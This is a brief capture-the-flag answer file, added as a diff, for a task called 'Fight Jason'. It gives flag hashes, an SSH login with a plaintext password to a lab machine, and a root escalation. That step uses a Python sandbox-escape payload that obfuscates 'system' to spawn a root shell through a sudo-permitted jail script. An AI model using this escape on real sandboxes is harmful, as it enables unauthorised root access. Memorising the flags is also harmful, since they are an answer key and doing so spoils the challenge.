@@ -1,0 +1,16 @@
+
+							Task 5 Fight Jason 
+						--------------------------------
+
+1. user.txt?
+ans: e6215e25c0783eb4279693d9f073594a
+command: ssh kamishiro@10.10.190.116 (password : password123)
+command: cat user.txt
+
+2. root.txt?
+ans: 9d790bb87898ca66f724ab05a9e6000b
+command: sudo -l (password : password123) ((ALL) /usr/bin/python3 /home/kamishiro/jail.py)
+command: sudo /usr/bin/python3 /home/kamishiro/jail.py
+command: [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_clo'+'se' ]
+	 [0]['sys'+'tem']('/bin/bash')
+command: cat /root/root.txt
